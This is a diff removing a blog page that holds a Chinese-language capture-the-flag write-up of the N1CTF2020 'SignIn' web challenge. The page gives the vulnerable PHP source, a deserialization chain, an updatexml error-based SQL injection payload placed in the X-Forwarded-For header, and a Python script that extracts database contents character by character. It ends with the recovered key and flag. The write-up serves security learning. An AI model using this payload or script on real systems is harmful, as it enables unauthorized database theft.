@@ -1,498 +1,0 @@
-<!DOCTYPE html>
-<html lang="en-us">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='N1CTF打不过根本打不过，就做了个签到
- SignIn 考点：反序列化，布尔盲注，报错注入
-这是源码：
-&amp;lt;?phphighlight_file(__FILE__);class ip {public $ip;public function waf($info){}public function __construct() {if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){$this-&amp;gt;ip = $this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);}else{$this-&amp;gt;ip =$_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;];}}public function __toString(){$con=mysqli_connect(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;********&amp;quot;,&amp;quot;n1ctf_websign&amp;quot;);$sqlquery=sprintf(&amp;quot;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&amp;quot;,$this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]),time());if(!mysqli_query($con,$sqlquery)){return mysqli_error($con);}else{return &amp;quot;your ip looks ok!&amp;quot;;}mysqli_close($con);}}class flag {public $ip;public $check;public function __construct($ip) {$this-&amp;gt;ip = $ip;}public function getflag(){if(md5($this-&amp;gt;check)===md5(&amp;quot;key****************&amp;quot;)){readfile(&#39;/flag&#39;);}return $this-&amp;gt;ip;}public function __wakeup(){if(stristr($this-&amp;gt;ip, &amp;quot;n1ctf&amp;quot;)!'><title>N1CTF2020</title>
-
-<link rel='canonical' href='https://anthem-whisper.github.io/p/n1ctf2020/'>
-
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='N1CTF2020'>
-<meta property='og:description' content='N1CTF打不过根本打不过，就做了个签到
- SignIn 考点：反序列化，布尔盲注，报错注入
-这是源码：
-&amp;lt;?phphighlight_file(__FILE__);class ip {public $ip;public function waf($info){}public function __construct() {if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){$this-&amp;gt;ip = $this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);}else{$this-&amp;gt;ip =$_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;];}}public function __toString(){$con=mysqli_connect(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;********&amp;quot;,&amp;quot;n1ctf_websign&amp;quot;);$sqlquery=sprintf(&amp;quot;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&amp;quot;,$this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]),time());if(!mysqli_query($con,$sqlquery)){return mysqli_error($con);}else{return &amp;quot;your ip looks ok!&amp;quot;;}mysqli_close($con);}}class flag {public $ip;public $check;public function __construct($ip) {$this-&amp;gt;ip = $ip;}public function getflag(){if(md5($this-&amp;gt;check)===md5(&amp;quot;key****************&amp;quot;)){readfile(&#39;/flag&#39;);}return $this-&amp;gt;ip;}public function __wakeup(){if(stristr($this-&amp;gt;ip, &amp;quot;n1ctf&amp;quot;)!'>
-<meta property='og:url' content='https://anthem-whisper.github.io/p/n1ctf2020/'>
-<meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' />
-<meta name="twitter:title" content="N1CTF2020">
-<meta name="twitter:description" content="N1CTF打不过根本打不过，就做了个签到
- SignIn 考点：反序列化，布尔盲注，报错注入
-这是源码：
-&amp;lt;?phphighlight_file(__FILE__);class ip {public $ip;public function waf($info){}public function __construct() {if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){$this-&amp;gt;ip = $this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);}else{$this-&amp;gt;ip =$_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;];}}public function __toString(){$con=mysqli_connect(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;********&amp;quot;,&amp;quot;n1ctf_websign&amp;quot;);$sqlquery=sprintf(&amp;quot;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&amp;quot;,$this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]),time());if(!mysqli_query($con,$sqlquery)){return mysqli_error($con);}else{return &amp;quot;your ip looks ok!&amp;quot;;}mysqli_close($con);}}class flag {public $ip;public $check;public function __construct($ip) {$this-&amp;gt;ip = $ip;}public function getflag(){if(md5($this-&amp;gt;check)===md5(&amp;quot;key****************&amp;quot;)){readfile(&#39;/flag&#39;);}return $this-&amp;gt;ip;}public function __wakeup(){if(stristr($this-&amp;gt;ip, &amp;quot;n1ctf&amp;quot;)!">
-    </head>
-    <body class="">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "auto");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.body.dataset.scheme = 'dark';
-        } else {
-            document.body.dataset.scheme = 'light';
-        }
-    })();
-</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
-            <aside class="sidebar left-sidebar sticky">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header class="site-info">
-        
-            <figure class="site-avatar">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-
-                
-                    <span class="emoji">🍥</span>
-                
-            </figure>
-        
-        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
-        <h2 class="site-description">专注Web安全和代码审计</h2>
-    </header>
-
-    <ol class="menu" id="main-menu">
-        
-        
-        
-
-        <li >
-            <a href='/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>Home</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/about'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        
-            <li id="dark-mode-toggle">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <span>暗色模式</span>
-            </li>
-        
-    </ol>
-</aside>
-
-            <main class="main full-width">
-    <div id="article-toolbar">
-        <a href="https://anthem-whisper.github.io/" class="back-home">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="15 6 9 12 15 18" />
-</svg>
-
-
-
-            <span>Back</span>
-        </a>
-    </div>
-
-    <article class="main-article">
-    <header class="article-header">
-
-    <div class="article-details">
-    
-
-    <h2 class="article-title">
-        <a href="/p/n1ctf2020/">N1CTF2020</a>
-    </h2>
-
-    </div>
-</header>
-
-    <section class="article-content">
-    <p>N1CTF打不过根本打不过，就做了个签到</p>
-<hr>
-<h3 id="signin">SignIn</h3>
-<p>考点：反序列化，布尔盲注，报错注入</p>
-<p>这是源码：</p>
-<pre><code>&lt;?php
-highlight_file(__FILE__);
-class ip {
-    public $ip;
-    public function waf($info){
-    }
-    public function __construct() {
-        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
-            $this-&gt;ip = $this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']);
-        }else{
-            $this-&gt;ip =$_SERVER[&quot;REMOTE_ADDR&quot;];
-        }
-    }
-    public function __toString(){
-        $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;);
-        $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
-        if(!mysqli_query($con,$sqlquery)){
-            return mysqli_error($con);
-        }else{
-            return &quot;your ip looks ok!&quot;;
-        }
-        mysqli_close($con);
-    }
-}
- 
-class flag {
-    public $ip;
-    public $check;
-    public function __construct($ip) {
-        $this-&gt;ip = $ip;
-    }
-    public function getflag(){
-        if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){
-            readfile('/flag');
-        }
-        return $this-&gt;ip;
-    }
-    public function __wakeup(){
-        if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False)
-            $this-&gt;ip = &quot;welcome to n1ctf2020&quot;;
-        else
-            $this-&gt;ip = &quot;noip&quot;;
-    }
-    public function __destruct() {
-        echo $this-&gt;getflag();
-    }
- 
-}
-if(isset($_GET['input'])){
-    $input = $_GET['input'];
-    unserialize($input);
-}
-
-</code></pre><p>思路是利用stristr函数触发__toString，然后在XFF头来进行一个sql注入</p>
-<pre><code>$pop = new flag();
-$pop-&gt;ip = new ip();
-echo serialize($pop);
-</code></pre><p>页面回显就只会有noip和welcome to n1ctf2020两种，因为__toString方法里面只有return，所以我们并不能直接看到mysql的回显（无论成功与否），只能利用两种回显来判断我们的sql语句是否逻辑正确。</p>
-<p>简单fuzz了一下，过滤了like、sleep、BENCHMARK，不能延时注入。</p>
-<p>因为他<code>return mysqli_error($con);</code>返回了MySQL的报错信息，我们便可以报错注入；</p>
-<pre><code>' or updatexml(1,concat(0x7e,(select if((1=1),'n1ctf',0)),0x7e),1) or '
-</code></pre><p>1=1和1=0分别返回了不同的信息。</p>
-<p>exp：</p>
-<pre><code>import requests
- 
-url = 'http://101.32.205.189/index.php?input=O:4:&quot;flag&quot;:2:{s:2:&quot;ip&quot;;O:2:&quot;ip&quot;:1:{s:2:&quot;ip&quot;;i:1;}s:5:&quot;check&quot;;s:4:&quot;test&quot;;}'
-result = ''
-req = requests.session()
-for x in range(1, 50):
-    high = 127
-    low = 32
-    mid = (low + high) // 2
-    while high &gt; low:
-        #babyselect = &quot;database()&quot;#n1ctf_websign
-        #babyselect = &quot;(select group_concat(table_name) from information_schema.tables where table_schema=database())&quot;#n1ip,n1key
-        #babyselect = &quot;(select group_concat(column_name) from information_schema.columns where table_name='n1key')&quot;#id,key
-        babyselect = &quot;(select `key` from n1key)&quot;#n1ctf20205bf75ab0a30dfc0c
-        select = &quot;ascii(substr({},{},1))&gt;{}&quot;.format(babyselect, x, mid)
-        payload = &quot;' or updatexml(1,concat(0x7e,(select if(({}),'n1ctf',0)),0x7e),1) or '&quot;.format(select)
-        data = {&quot;X-Forwarded-For&quot;: payload}
-        resp = requests.get(url, headers=data)  #GET:params=data POST:data=data
-        print(payload)
-        if resp.text.count('welcome to n1ctf2020') == 2:  #
-            low = mid + 1
-        else:
-            high = mid
-        mid = (low + high) // 2
-    # print(mid)
-    result += chr(int(mid))
-    print(result)
-print(&quot;end.......&quot;)
-print(result)
-</code></pre><p>key是关键字，只能select <code>key</code></p>
-<p>得到key：n1ctf20205bf75ab0a30dfc0c</p>
-<pre><code>$pop = new flag();
-$pop-&gt;ip = new ip();
-$pop-&gt;check = &quot;n1ctf20205bf75ab0a30dfc0c&quot;;
-echo serialize($pop);
-</code></pre><p>传参得到：</p>
-<p>n1ctf{you_g0t_1t_hack_for_fun}</p>
-
-</section>
-
-
-    <footer class="article-footer">
-    
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-    
-</article>
-
-    <aside class="related-contents--wrapper">
-    
-    
-</aside>
-
-
-    
-        
-    <div class="disqus-container">
-    <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</div>
-
-<style>
-    .disqus-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-    }
-</style>
-
-<script>
-    window.addEventListener('onColorSchemeChange', (e) => {
-        if (DISQUS) {
-            DISQUS.reset({
-                reload: true
-            });
-        }
-    })
-</script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2020 - 
-        
-        2021 wh1sper
-    </section>
-    
-    <section class="powerby">
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
-    </section>
-</footer>
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
-            >
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
-                defer="false"
-                >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-    </body>
-</html>
